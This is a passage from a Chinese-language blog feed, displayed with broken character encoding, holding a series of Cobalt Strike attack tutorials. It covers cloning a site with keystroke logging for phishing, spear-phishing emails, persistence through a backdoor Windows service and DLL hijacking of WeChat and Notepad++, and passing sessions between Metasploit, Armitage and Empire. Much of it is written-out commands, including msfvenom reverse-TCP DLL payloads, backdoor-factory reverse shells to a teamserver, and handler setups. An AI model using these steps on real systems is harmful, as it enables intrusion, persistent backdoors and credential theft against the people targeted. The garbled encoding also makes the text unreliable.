!!!URL: http://10.97.3.177:8080/cgi-bin/login.htmlLogin: adminPassword: admin..........å†…å®¹å¤ªå¤šï¼Œçœç•¥äº†</code></pre><p>Cobaltstrikeä¹Ÿæ”¶åˆ°äº†ä¼šè¯ï¼ˆæˆ‘æ’äº†å¥½å‡ æ¬¡ï¼‰<br><a href="https://imgchr.com/i/eAClyn"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191454731.png" alt="eAClyn.png"></a></p><h2 id="0x005æ”»å‡»åœºæ™¯"><a href="#0x005æ”»å‡»åœºæ™¯" class="headerlink" title="0x005æ”»å‡»åœºæ™¯"></a>0x005æ”»å‡»åœºæ™¯</h2><p>â‘ ç¤¾å·¥æ”»å‡»<br>  å°å§å§ï¼Œæˆ‘çš„Uç›˜æ’æˆ‘çš„ç”µè„‘æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œä½ èƒ½å¸®æˆ‘çœ‹çœ‹ä½ çš„ç”µè„‘å¯ä»¥å—ï¼Ÿ<br>  <a href="https://imgchr.com/i/eACGwV"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455578.png" alt="eACGwV.png"></a><br>â‘¡å¸¦æœ‰USBæ¥å£çš„ç»ˆç«¯æœº<br><a href="https://imgchr.com/i/eACJoT"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455649.png" alt="eACJoT.png"></a><br>æ‰¾åˆ°USBæ¥å£æ€¼è¿›å»ï¼Œæ’è°è°æ€€å­•<br>å…¶ä»–åº”ç”¨åœºæ™¯è‡ªè¡Œè„‘è¡¥ï¼Œæ¬¢è¿è¯„è®ºåˆ†äº«</p><h2 id="0x06æ€»ç»“"><a href="#0x06æ€»ç»“" class="headerlink" title="0x06æ€»ç»“"></a>0x06æ€»ç»“</h2><p>   ä»Šå¤©ä»‹ç»äº†ç¡¬ä»¶è®¾å¤‡Badusbçš„åˆ¶ä½œåŠä½¿ç”¨ï¼Œå¤§å®¶å¯ä»¥ä¿®æ”¹æœåŠ¡å™¨ç«¯çš„powershellä»£ç æ¥å®ç°æ›´å¤šçš„åŠŸèƒ½ï¼Œæ¬¢è¿è¯„è®ºåˆ†äº«è‡ªå·±çš„æ€è·¯<br>æœ¬ç¯‡æ–‡ç« è€—æ—¶7å°æ—¶ï¼Œä¹Ÿç®—æ˜¯è‡ªå·±å†™è¿‡æ¯”è¾ƒé•¿çš„å•¦ã€‚<br><a href="https://imgchr.com/i/eAC1Lq"><img src="https://j0o1ey-1251589192.cos.ap-beijing.myqcloud.com/202304191455674.png" alt="eAC1Lq.png"></a></p><h2 id="0x006-Badusbä»£ç ä¸‹è½½"><a href="#0x006-Badusbä»£ç ä¸‹è½½" class="headerlink" title="0x006 Badusbä»£ç ä¸‹è½½"></a>0x006 Badusbä»£ç ä¸‹è½½</h2><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg">https://pan.baidu.com/s/1ODHBZXUlyRxwk75Q6yuIXg</a><br>æå–ç ï¼šzisl</p>]]></content>
      
      
      <categories>
          
          <category> ç¡¬ä»¶å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¡¬ä»¶å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(åå››)ç½‘ç«™å…‹éš†ä¸é‚®ä»¶é±¼å‰é’“é±¼</title>
      <link href="/2019/06/21/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E5%9B%9B-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E4%B8%8E%E9%82%AE%E4%BB%B6%E9%B1%BC%E5%8F%89%E9%92%93%E9%B1%BC/"/>
      <url>/2019/06/21/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E5%9B%9B-%E7%BD%91%E7%AB%99%E5%85%8B%E9%9A%86%E4%B8%8E%E9%82%AE%E4%BB%B6%E9%B1%BC%E5%8F%89%E9%92%93%E9%B1%BC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01-å‰è¨€"></a>0x01-å‰è¨€</h2><p>äº²ä»¬ï¼Œè¿™ç¯‡æ˜¯cobaltstrikeç³»åˆ—æ•™ç¨‹çš„æœ€åä¸€ç¯‡å•¦~å†™è¿™å¥—æ•™ç¨‹ï¼Œæˆ‘è¶³è¶³å†™äº†ä¸€ä¸ªå‘¨ï¼Œè¿˜æ˜¯éå¸¸ç–²æƒ«çš„ï¼Œä½†æ˜¯æƒ³åˆ°å¤§å®¶å¯ä»¥ä»ä¸­æ”¶è·ä¸€äº›ä¸œè¥¿ï¼Œä¾¿åˆå……æ»¡äº†åŠ›é‡ã€‚</p><p>è¿™ä¸ªæµ®èºçš„æ—¶ä»£ï¼Œå¾ˆå°‘æœ‰äººä¼šé™ä¸‹å¿ƒæ¥å­¦ä¹ ä¸åˆ†äº«ï¼Œæˆ‘ä¹Ÿæ˜¯æµ®èºçš„ä¸€å‘˜ï¼Œä½†ä¹Ÿæƒ³ä¸ºè¿™ä¸ªåœˆå­ç•™ä¸‹ç‚¹ä¸œè¥¿ï¼Œå› æ­¤å†³å®šå¹³æ—¶å¤šå†™ä¸€äº›æ–‡ç« ä¾›å¤§å®¶é˜…è¯»ã€‚</p><h2 id="0x02-ç½‘ç«™å…‹éš†"><a href="#0x02-ç½‘ç«™å…‹éš†" class="headerlink" title="0x02-ç½‘ç«™å…‹éš†"></a>0x02-ç½‘ç«™å…‹éš†</h2><p>èœå•æ ï¼Œæ”»å‡»â€“&gt;é’“é±¼æ”»å‡»â€“&gt;å…‹éš†ç½‘ç«™<br><a href="https://imgchr.com/i/e8rLxP"><img src="https://s2.ax1x.com/2019/07/29/e8rLxP.png" alt="e8rLxP.png"></a><br>æ ¹æ®ä½ çš„ä¸ªäººéœ€æ±‚ï¼Œå¡«å†™å…‹éš†ç½‘å€ï¼Œä¸»æœºåœ°å€ï¼Œå’Œä½ çš„ç«¯å£ï¼Œæ³¨æ„ç«¯å£ä¸è¦å†²çª<br>è®°å¾—æŠŠé”®ç›˜è®°å½•æ‰“å¼€<br><a href="https://imgchr.com/i/e8roUH"><img src="https://s2.ax1x.com/2019/07/29/e8roUH.png" alt="e8roUH.png"></a><br>å¦‚å›¾ï¼Œæˆ‘ä»¬æˆåŠŸå…‹éš†å‡ºä¸€ä¸ªç™¾åº¦<br><a href="https://imgchr.com/i/e8rHPA"><img src="https://s2.ax1x.com/2019/07/29/e8rHPA.png" alt="e8rHPA.png"></a></p><p>éšåæˆ‘ä»¬åœ¨ï¼Œè§†å›¾â€“&gt;webæ—¥å¿—ä¸­æŸ¥çœ‹ç›¸å…³ä¿¡æ¯<br><a href="https://imgchr.com/i/e8rIVe"><img src="https://s2.ax1x.com/2019/07/29/e8rIVe.png" alt="e8rIVe.png"></a><br>å¦‚å›¾ï¼Œä¸€ä½ä¸çŸ¥åçš„ç”¨æˆ·åœ¨è¯¥é¡µé¢è¾“å…¥äº†J0o1ey dashuaibi<br><a href="https://imgchr.com/i/e8rb8I"><img src="https://s2.ax1x.com/2019/07/29/e8rb8I.png" alt="e8rb8I.png"></a></p><h2 id="0x03-é‚®ä»¶é±¼å‰é’“é±¼"><a href="#0x03-é‚®ä»¶é±¼å‰é’“é±¼" class="headerlink" title="0x03-é‚®ä»¶é±¼å‰é’“é±¼"></a>0x03-é‚®ä»¶é±¼å‰é’“é±¼</h2><p>ä½¿ç”¨ æ”»å‡»â€“&gt;é‚®ä»¶é’“é±¼</p><pre><code>targets å‘é€çš„ç›®æ ‡ä¿¡æ¯ æ ¼å¼ xxxx@xxx.com(tabé”®) name55x@qq.com        TOMxx@163.com        jimtmplate é‚®ä»¶æ¨¡æ¿ ä¸€èˆ¬åœ¨é‚®ä»¶çš„æ›´å¤šé€‰é¡¹ä¸­ ï¼Œé€‰æ‹©å¯¼å‡ºï¼Œæˆ–è€…æ˜¾ç¤ºåŸæ–‡attachment é™„ä»¶Embed URL è¦åµŒå…¥çš„ç½‘å€Mail server SMTPBounce to æ¨¡ä»¿å‘ä»¶äººpreview é¢„è§ˆæˆ‘ä»¬çš„æ¨¡æ¿æ–‡ä»¶ </code></pre><p><a href="https://imgchr.com/i/e8rq2t"><img src="https://s2.ax1x.com/2019/07/29/e8rq2t.png" alt="e8rq2t.png"></a><br>sendå‘é€æˆåŠŸåæˆ‘ä»¬å¯ä»¥åœ¨ send email çœ‹åˆ°æç¤º</p><p>è¿™ä¸ªåŠŸèƒ½ä¸æ¨èå¤§å®¶ä½¿ç”¨ï¼Œå‘å‡ºå»çš„é‚®ä»¶æ³¼å‡ºå»çš„æ°´ï¼Œå¾ˆå®¹æ˜“è¢«å–è¯çš„ï¼Œè‡ªå·±å¨±ä¹ç©ä¸‹å°±å¥½</p><p><a href="https://imgchr.com/i/e8rjr8"><img src="https://s2.ax1x.com/2019/07/29/e8rjr8.png" alt="e8rjr8.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(åä¸‰)æ§åˆ¶æŒä¹…åŒ–</title>
      <link href="/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%89-%E6%8E%A7%E5%88%B6%E6%8C%81%E4%B9%85%E5%8C%96/"/>
      <url>/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%89-%E6%8E%A7%E5%88%B6%E6%8C%81%E4%B9%85%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-å³é”®èœå•å®ç°æ§åˆ¶æŒä¹…åŒ–"><a href="#0x01-å³é”®èœå•å®ç°æ§åˆ¶æŒä¹…åŒ–" class="headerlink" title="0x01-å³é”®èœå•å®ç°æ§åˆ¶æŒä¹…åŒ–"></a>0x01-å³é”®èœå•å®ç°æ§åˆ¶æŒä¹…åŒ–</h2><p>åœ¨windowsä¸­ï¼Œæ‹¿åˆ°ç›®æ ‡ä¸»æœºæƒé™åï¼Œï¼Œç»´æŒæƒé™æ˜¯å¿…ä¸å¯å°‘çš„å·¥ä½œã€‚<br>ç›®å‰å¸¸è§çš„æ‰‹æ³•æœ‰:</p><pre><code>1.æ³¨å†Œè¡¨2.å¯åŠ¨é¡¹3.è®¡æ—¶ä»»åŠ¡4.è®¾ç½®æœåŠ¡5.shiftåé—¨6.dllåŠ«æŒ(ç™½åŠ é»‘)7.åˆ©ç”¨å…¶ä»–å®‰è£…çš„è½¯ä»¶</code></pre><p>åœ¨æˆ‘ä¹‹å‰ç»™å‡ºçš„æ’ä»¶ä¸­ï¼Œå·²ç»åŒ…å«äº†æ§åˆ¶æŒä¹…åŒ–çš„æ’ä»¶<br>å¦‚å›¾ï¼Œé‡Œé¢åŒ…å«äº†å¾ˆå¤šæ§åˆ¶æŒä¹…åŒ–çš„æ–¹æ³•ï¼Œå¯è‡ªåŠ¨æ‰§è¡Œ<br><a href="https://imgchr.com/i/e8U66e"><img src="https://s2.ax1x.com/2019/07/29/e8U66e.png" alt="e8U66e.png"></a></p><p>å‰å‡ ä¸ªPersist(â€»)è²Œä¼¼éƒ½æ˜¯åŠ«æŒå…³é”®ç¨‹åºçš„dllå®ç°æ§åˆ¶æŒä¹…åŒ–</p><p>Sticky Keysæ˜¯å¤§å®¶ç†Ÿæ‚‰çš„ç²˜æ»é”®åé—¨(shiftåé—¨ï¼Œæ‘äº”ä¸‹shiftå¼¹å‡ºcmdçª—å£)</p><p>Scheduled Jobæ–¹æ³•ä¸ºå†™è®¡åˆ’ä»»åŠ¡ç»´æŒæƒé™</p><p>åˆ©ç”¨è¿™ä¸ªèœå•å®ç°æ§åˆ¶æŒä¹…åŒ–è™½ç„¶æ–¹ä¾¿ï¼Œä½†æ˜¯å­˜åœ¨ä¸€å®šçš„å±€é™ï¼Œä¹Ÿæœ‰å¾ˆå¤šé—®é¢˜ï¼Œä¸‹é¢ç®€å•è®²ä¸¤ç§ä¸ªäººå¸¸ç”¨çš„ç»´æŒæƒé™çš„æ–¹æ³•</p><h2 id="0x02-Windows-Serviceç»´æŒæƒé™"><a href="#0x02-Windows-Serviceç»´æŒæƒé™" class="headerlink" title="0x02-Windows Serviceç»´æŒæƒé™"></a>0x02-Windows Serviceç»´æŒæƒé™</h2><p>åœ¨cobaltstrikeä¸­ç”Ÿæˆä¸€ä¸ªWindows serviceæœåŠ¡åé—¨<br><a href="https://imgchr.com/i/e8UWTI"><img src="https://s2.ax1x.com/2019/07/29/e8UWTI.png" alt="e8UWTI.png"></a></p><p>å¯¼å‡ºæ—¶åé—¨åä¸ºbeacon.exe<br><a href="https://imgchr.com/i/e8UylD"><img src="https://s2.ax1x.com/2019/07/29/e8UylD.png" alt="e8UylD.png"></a><br>éšååœ¨beaconä¸­æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p><pre><code>beacon&gt; cd C:\WINDOWS\Temp\[] cd C:\WINDOWS\Temp\[+] host called home, sent: 24 bytes beacon&gt; upload /root/beacon.exe[] Tasked beacon to upload /root/beacon.exe as beacon.exe[+] host called home, sent: 309782 bytesbeacon&gt; shell sc create &quot;thisisserver&quot; binpath= &quot;C:\WINDOWS\Temp\beacon.exe&quot;[] Tasked beacon to run: sc create &quot;thisisserver&quot; binpath= &quot;C:\WINDOWS\Temp\beacon.exe&quot;[+] host called home, sent: 93 bytes[+] received output:[SC] CreateService æˆåŠŸbeacon&gt; shell sc description &quot;thisisserver&quot; &quot;description&quot;[] Tasked beacon to run: sc description &quot;thisisserver&quot; &quot;description&quot;[+] host called home, sent: 74 bytes[+] received output:[SC] ChangeServiceConfig2 æˆåŠŸbeacon&gt; shell sc config &quot;thisisserver&quot; start= auto[] Tasked beacon to run: sc config &quot;thisisserver&quot; start= auto[+] host called home, sent: 67 bytes[+] received output:[SC] ChangeServiceConfig æˆåŠŸbeacon&gt; shell net start &quot;thisisserver&quot;[] Tasked beacon to run: net start &quot;thisisserver&quot;[+] host called home, sent: 55 bytes*</code></pre><p>è¿™æ ·çš„è¯ç›®æ ‡æœºæ¯æ¬¡å¼€æœºï¼Œéƒ½ä¼šè¿è¡Œä½ çš„beacon.exeåé—¨ï¼Œå®ç°æ§åˆ¶çš„æŒä¹…åŒ–ã€‚<br>å½“ç„¶ï¼Œå¦‚æœç›®æ ‡ä¸»æœºå­˜åœ¨æ€æ¯’å…¨å®¶æ¡¶çš„è¯ï¼Œé‚£ä¹ˆå¯¹ä½ åé—¨çš„å…æ€æ˜¯æœ‰å¾ˆé«˜è¦æ±‚çš„ï¼Œè‡³äºcobaltstrikeåé—¨çš„å…æ€ï¼Œæ‰“ç®—è¿‡ä¸€æ®µæ—¶é—´åšä¸ªç•ªå¤–ç¯‡è®²ï¼Œè€é“ä»¬å¯ä»¥å…³æ³¨ä¸‹~</p><h2 id="0x03-dllåŠ«æŒ-ç™½åŠ é»‘-ç»´æŒæƒé™"><a href="#0x03-dllåŠ«æŒ-ç™½åŠ é»‘-ç»´æŒæƒé™" class="headerlink" title="0x03-dllåŠ«æŒ(ç™½åŠ é»‘)ç»´æŒæƒé™"></a>0x03-dllåŠ«æŒ(ç™½åŠ é»‘)ç»´æŒæƒé™</h2><p>DllåŠ«æŒçš„è¯ï¼Œä¸»è¦æ˜¯åŠ«æŒé‚£äº›ç»å¸¸è¿è¡Œç¨‹åºçš„dllï¼Œè¿™æ ·ç¨‹åºä¸€è¿è¡Œï¼Œå°±ä¼šåŠ è½½æˆ‘ä»¬çš„æ¶æ„dllã€‚å®ç°æ§åˆ¶æŒä¹…åŒ–</p><h3 id="æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼ŒåŠ«æŒå¾®ä¿¡çš„dll"><a href="#æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼ŒåŠ«æŒå¾®ä¿¡çš„dll" class="headerlink" title="æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼ŒåŠ«æŒå¾®ä¿¡çš„dll"></a>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼ŒåŠ«æŒå¾®ä¿¡çš„dll</h3><p>é¦–å…ˆä½¿ç”¨Process ExploreæŸ¥çœ‹å¾®ä¿¡è°ƒç”¨çš„æ–‡ä»¶<br><a href="https://imgchr.com/i/e8U0Fx"><img src="https://s2.ax1x.com/2019/07/29/e8U0Fx.png" alt="e8U0Fx.png"></a></p><p>æœ¬æ¬¡æµ‹è¯•ï¼Œæ˜¯åŠ«æŒçš„ä»–çš„d3dcompiler_47.dll<br>ä½¿ç”¨backdoor factoryåˆ¶ä½œdllåé—¨(ä¿å­˜åœ¨ç›®å½•çš„backdooredæ–‡ä»¶å¤¹ä¸‹)<br>é“¾æ¥:<a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a><br>å‘½ä»¤å¦‚ä¸‹</p><pre><code>python backdoor.py -f d3dcompiler_47.dll -s reverse_shell_tcp_inline -P 6666 -H 8.8.8.8(ä½ çš„teamserver)</code></pre><p><a href="https://imgchr.com/i/e8UtOJ"><img src="https://s2.ax1x.com/2019/07/29/e8UtOJ.png" alt="e8UtOJ.png"></a><br>æŠŠè¿™ä¸ªåŠ äº†åé—¨çš„dllæ”¾åˆ°å¾®ä¿¡ç¨‹åºçš„æ–‡ä»¶å¤¹ä¸‹<br>ç”¨cobaltstrikeé…ç½®ä¸€ä¸ªtcpåè®®ç›‘å¬6666ç«¯å£çš„Listenerï¼Œæˆ–è€…ncç›‘å¬6666ç«¯å£ï¼Œç›®æ ‡æœºè¿è¡Œå¾®ä¿¡æ—¶ï¼Œå³å¯æ”¶åˆ°åå¼¹çš„shell</p><h3 id="å†çœ‹ä¸€ä¸ªï¼ŒåŠ«æŒnotepadçš„dllï¼š"><a href="#å†çœ‹ä¸€ä¸ªï¼ŒåŠ«æŒnotepadçš„dllï¼š" class="headerlink" title="å†çœ‹ä¸€ä¸ªï¼ŒåŠ«æŒnotepadçš„dllï¼š"></a>å†çœ‹ä¸€ä¸ªï¼ŒåŠ«æŒnotepadçš„dllï¼š</h3><p>æˆ‘ä»¬é¦–å…ˆæ‰“å¼€Kaliï¼Œç”¨Metasploitæˆ–è€…cobaltstrikeæ¥ç”Ÿæˆä¸€ä¸ªdllæœ¨é©¬<br>Metasploitç”Ÿæˆdllåé—¨å‘½ä»¤</p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 lhost=192.168.199.107 lport=6666 -f dll &gt; ./Msimg32.dll</code></pre><p>Cobaltstrikeç”Ÿæˆdllåé—¨æ–¹æ³•<br><a href="https://imgchr.com/i/e8UR0A"><img src="https://s2.ax1x.com/2019/07/29/e8UR0A.png" alt="e8UR0A.png"></a></p><p>ç„¶åé…ç½®6666ç«¯å£çš„ç›‘å¬<br>Metasploit:</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.199.107set lport 6666exploit</code></pre><p>Cobaltstrike:<br>è¯·çœ‹æ•™ç¨‹ç¬¬äºŒèŠ‚</p><p>ç„¶åæˆ‘ä»¬æŠŠdllæ”¾åˆ°notepadæ–‡ä»¶å¤¹ä¸­ï¼Œè¿è¡Œnotpad++ï¼Œå³å¯è¿”å›ä¼šè¯ã€‚</p><p><a href="https://imgchr.com/i/e8UsSO"><img src="https://s2.ax1x.com/2019/07/29/e8UsSO.png" alt="e8UsSO.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(åäºŒ)CSä¸MSF,Armitage,Empireä¼šè¯äº’è½¬</title>
      <link href="/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%BA%8C-CS%E4%B8%8EMSF-Armitage-Empire%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC/"/>
      <url>/2019/06/20/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%BA%8C-CS%E4%B8%8EMSF-Armitage-Empire%E4%BC%9A%E8%AF%9D%E4%BA%92%E8%BD%AC/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-Cobaltstrikeä¸MSFä¼šè¯äº’è½¬"><a href="#0x01-Cobaltstrikeä¸MSFä¼šè¯äº’è½¬" class="headerlink" title="0x01-Cobaltstrikeä¸MSFä¼šè¯äº’è½¬"></a>0x01-Cobaltstrikeä¸MSFä¼šè¯äº’è½¬</h2><h3 id="â‘ Metasploitæ´¾ç”Ÿshellç»™Cobaltstrike"><a href="#â‘ Metasploitæ´¾ç”Ÿshellç»™Cobaltstrike" class="headerlink" title="â‘ Metasploitæ´¾ç”Ÿshellç»™Cobaltstrike"></a>â‘ Metasploitæ´¾ç”Ÿshellç»™Cobaltstrike</h3><p>é¦–å…ˆï¼Œä½ éœ€è¦æ‹¿åˆ°ä¸€ä¸ªmetepreterä¼šè¯ï¼Œæœ¬ä¾‹ä¸­sessionä¸º1<br>Cobaltstrikeçš„teamserverçš„ipä¸º8.8.8.8ï¼Œhttpç›‘å¬å™¨ç«¯å£ä¸º4555</p><pre><code>msf exploit(handler) &gt;  use exploit/windows/local/payload_injectmsf exploit(payload_inject) &gt;  set PAYLOAD windows/meterpreter/reverse_httpmsf exploit(payload_inject) &gt; set DisablePayloadHandler truemsf exploit(payload_inject) &gt; set LHOST 8.8.8.8.msf exploit(payload_inject) &gt; set LPORT 4555msf exploit(payload_inject) &gt; set SESSION 1msf exploit(payload_inject) &gt; exploit</code></pre><p>å¦‚å›¾CobaltstrikeæˆåŠŸä¸Šçº¿<br><a href="https://imgchr.com/i/e8Qn4H"><img src="https://s2.ax1x.com/2019/07/29/e8Qn4H.png" alt="e8Qn4H.png"></a></p><h3 id="â‘¡Cobalt-strike-æ´¾ç”Ÿ-shell-ç»™-MSF-å‰ææœ‰ä¸ªbeacon-shell"><a href="#â‘¡Cobalt-strike-æ´¾ç”Ÿ-shell-ç»™-MSF-å‰ææœ‰ä¸ªbeacon-shell" class="headerlink" title="â‘¡Cobalt strike æ´¾ç”Ÿ shell ç»™ MSF(å‰ææœ‰ä¸ªbeacon shell)"></a>â‘¡Cobalt strike æ´¾ç”Ÿ shell ç»™ MSF(å‰ææœ‰ä¸ªbeacon shell)</h3><pre><code>msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 8.8.8.8lhost =&gt; 8.8.8.8msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit</code></pre><p>ç„¶ååœ¨cobaltstrikeä¸­åˆ›å»ºä¸€ä¸ªwindows&#x2F;foreign&#x2F;reverse_tcp Listener<br>ï¼Œå¹¶æ ¹æ®metasploitç›‘å¬é…ç½®cobaltstrikeçš„listener<br><a href="https://imgchr.com/i/e8QVHO"><img src="https://s2.ax1x.com/2019/07/29/e8QVHO.png" alt="e8QVHO.png"></a></p><p>é€‰æ‹©è¦æ´¾ç”Ÿçš„beaconï¼Œå³é”®â€“&gt;å¢åŠ ä¼šè¯ï¼Œé€‰æ‹©åˆšåˆšé…ç½®çš„foreignç›‘å¬å™¨<br><a href="https://imgchr.com/i/e8QEDK"><img src="https://s2.ax1x.com/2019/07/29/e8QEDK.png" alt="e8QEDK.png"></a></p><p>MSFå³å¯æˆåŠŸæ”¶åˆ°ä¼šè¯<br><a href="https://imgchr.com/i/e8QAu6"><img src="https://s2.ax1x.com/2019/07/29/e8QAu6.png" alt="e8QAu6.png"></a></p><h2 id="0x02-Cobaltstrikeä¸Armitageä¼šè¯äº’è½¬"><a href="#0x02-Cobaltstrikeä¸Armitageä¼šè¯äº’è½¬" class="headerlink" title="0x02-Cobaltstrikeä¸Armitageä¼šè¯äº’è½¬"></a>0x02-Cobaltstrikeä¸Armitageä¼šè¯äº’è½¬</h2><h3 id="â‘ Cobaltstrikeæ´¾ç”Ÿshellç»™Armitage"><a href="#â‘ Cobaltstrikeæ´¾ç”Ÿshellç»™Armitage" class="headerlink" title="â‘ Cobaltstrikeæ´¾ç”Ÿshellç»™Armitage"></a>â‘ Cobaltstrikeæ´¾ç”Ÿshellç»™Armitage</h3><p>é¦–å…ˆåœ¨armitageä¸­é…ç½®ä¸€ä¸ªhandlerï¼Œæ³¨æ„ï¼špayloadè¦ä¸cobaltstrikeçš„foreignç›‘å¬å™¨çš„åè®®ç›¸åŒï¼Œä¸ç„¶æ”¶ä¸åˆ°ä¼šè¯ã€‚<br><a href="https://imgchr.com/i/e8Qlvt"><img src="https://s2.ax1x.com/2019/07/29/e8Qlvt.png" alt="e8Qlvt.png"></a><br>åŒæ ·ä½¿ç”¨åˆšåˆšè®²è¿‡çš„cobaltstrikeæ´¾ç”Ÿä¼šè¯åŠŸèƒ½ï¼Œarmitageå³å¯æ”¶åˆ°shell<br><a href="https://imgchr.com/i/e8Q3KP"><img src="https://s2.ax1x.com/2019/07/29/e8Q3KP.png" alt="e8Q3KP.png"></a></p><h3 id="Armitageæ´¾ç”Ÿshellç»™cobaltstrike"><a href="#Armitageæ´¾ç”Ÿshellç»™cobaltstrike" class="headerlink" title="Armitageæ´¾ç”Ÿshellç»™cobaltstrike"></a>Armitageæ´¾ç”Ÿshellç»™cobaltstrike</h3><p>é€‰æ‹©armitageä¸­çš„ä¼šè¯ï¼Œå³é”®ï¼ŒAccessâ€“&gt;Pss Session<br><a href="https://imgchr.com/i/e8QeED"><img src="https://s2.ax1x.com/2019/07/29/e8QeED.png" alt="e8QeED.png"></a><br>éšåé…ç½®ç›¸å…³ä¿¡æ¯ä¸ºcobaltstrike httpç›‘å¬å™¨çš„ipå’Œç«¯å£<br><a href="https://imgchr.com/i/e8QmUe"><img src="https://s2.ax1x.com/2019/07/29/e8QmUe.png" alt="e8QmUe.png"></a><br>Cobaltstrikeå³å¯æ”¶åˆ°ä¼šè¯</p><h2 id="0x003-Cobaltstrikeä¸Empireä¼šè¯äº’è½¬"><a href="#0x003-Cobaltstrikeä¸Empireä¼šè¯äº’è½¬" class="headerlink" title="0x003-Cobaltstrikeä¸Empireä¼šè¯äº’è½¬"></a>0x003-Cobaltstrikeä¸Empireä¼šè¯äº’è½¬</h2><p>é¦–å…ˆå¦‚å›¾ï¼Œåœ¨empireä¸­é…ç½®å¥½ç›¸å…³çš„httpåè®®ç›‘å¬å™¨<br><a href="https://imgchr.com/i/e8QKCd"><img src="https://s2.ax1x.com/2019/07/29/e8QKCd.png" alt="e8QKCd.png"></a><br>åœ¨cobaltstrikeé‡Œé¢æ·»åŠ ä¸€ä¸ªforeignç›‘å¬å™¨ï¼Œåè®®ä¸ºhttp<br><a href="https://imgchr.com/i/e8QM8A"><img src="https://s2.ax1x.com/2019/07/29/e8QM8A.png" alt="e8QM8A.png"></a><br>éšåä½¿ç”¨cobaltstrikeä¸­è®²è¿‡çš„â€œå¢åŠ ä¼šè¯â€åŠŸèƒ½ï¼Œé€‰æ‹©è¯¥httpç›‘å¬å™¨ï¼Œempireå³å¯æˆåŠŸæ”¶åˆ°ä¼šè¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å®‰å…¨å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cobaltstrikeç³»åˆ—æ•™ç¨‹(åä¸€)ææƒä¸æ¨ªå‘ç§»åŠ¨</title>
      <link href="/2019/06/17/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%80-%E6%8F%90%E6%9D%83%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
      <url>/2019/06/17/Cobaltstrike%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%8D%81%E4%B8%80-%E6%8F%90%E6%9D%83%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="0x001-ææƒ"><a href="#0x001-ææƒ" class="headerlink" title="0x001-ææƒ"></a>0x001-ææƒ</h2><h3 id="1-å³é”®èœå•ææƒ"><a href="#1-å³é”®èœå•ææƒ" class="headerlink" title="1.å³é”®èœå•ææƒ:"></a>1.å³é”®èœå•ææƒ:</h3><p>é€‰æ‹©beaconï¼Œå³é”®ï¼Œæ‰§è¡Œâ€“&gt;ææƒ<br><img src="https://s2.ax1x.com/2019/07/29/e1wAFP.png" alt="e1wAFP.png"><br>æˆ‘ç”±äºåŠ è½½äº†æ’ä»¶ï¼Œæ‰€ä»¥æ¯”å®˜æ–¹å¤šäº†å‡ ç§ææƒæ–¹å¼<br>æ’ä»¶ä¸‹è½½è¯·çœ‹æˆ‘ä¹‹å‰çš„å¸–å­<br><a href="https://imgchr.com/i/e1dbZR"><img src="https://s2.ax1x.com/2019/07/29/e1dbZR.png" alt="e1dbZR.png"></a></p><h3 